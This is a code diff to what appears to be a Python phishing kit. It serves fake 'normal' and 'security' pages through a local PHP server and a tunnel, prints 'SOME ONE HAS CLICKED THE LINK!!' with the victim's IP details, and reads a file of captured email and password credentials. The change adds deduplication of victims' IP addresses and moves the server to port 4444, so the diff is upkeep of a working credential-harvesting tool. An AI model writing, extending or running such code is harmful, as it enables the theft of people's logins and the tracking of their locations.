@@ -114,17 +114,41 @@ def handle_verification(folder):
     
     if os.path.exists(ip_file):
         with open(ip_file, 'r') as file:
-            #ip_info = file.read()
-            print(_colored("\rSOME ONE HAS CLICKED THE LINK!! INFO:", "red"),"\n")
-            print(_colored("\r══════════════", "green"))
+            # Extract IP from the file
+            current_ip = None
             for line in file:
-                 stripped_line = line.strip()  # Remove leading and trailing whitespace
-                 if stripped_line:  # If the line is not blank
-                     print("\r" + stripped_line)  # Print with \r at the start
-
-            print(_colored("\r══════════════", "green"))
+                stripped_line = line.strip()
+                if stripped_line.startswith("IP"):
+                    current_ip = stripped_line.split()[2]  # Extract the IP (3rd value)
+                    break
+    
+        if current_ip:
+            stored_ip_file = 'stored_ip.txt'  # Path to store the previous IP
+            previous_ip = None
+            
+            # Check if stored_ip.txt exists and read the previous IP
+            if os.path.exists(stored_ip_file):
+                with open(stored_ip_file, 'r') as f:
+                    previous_ip = f.read().strip()
+    
+            # Compare the current IP with the previous one
+            if current_ip != previous_ip:
+                # Print the info only if the IP is different
+                print(_colored("\rSOME ONE HAS CLICKED THE LINK!! INFO:", "red"), "\n")
+                print(_colored("\r══════════════", "green"))
+                with open(ip_file, 'r') as file:
+                    for line in file:
+                        stripped_line = line.strip()  # Remove leading and trailing whitespace
+                        if stripped_line:  # If the line is not blank
+                            print("\r" + stripped_line)  # Print with \r at the start
+                print(_colored("\r══════════════", "green"))
+    
+                # Save the new IP
+                with open(stored_ip_file, 'w') as f:
+                    f.write(current_ip)
+    
+        # Clean up by removing the IP file
         os.remove(ip_file)
-        
     
     if os.path.exists(cred_file):
         email, password = None, None
@@ -208,9 +232,9 @@ def main():
     srv_num = server_path()
     
     if path == 1:
-        php_server1 = php_server("normal/", port=3333)
+        php_server1 = php_server("normal/", port=4444)
     elif path == 2:
-        php_server1 = php_server("security/", port=3333)
+        php_server1 = php_server("security/", port=4444)
     
     if srv_num == 1:
         serveo()
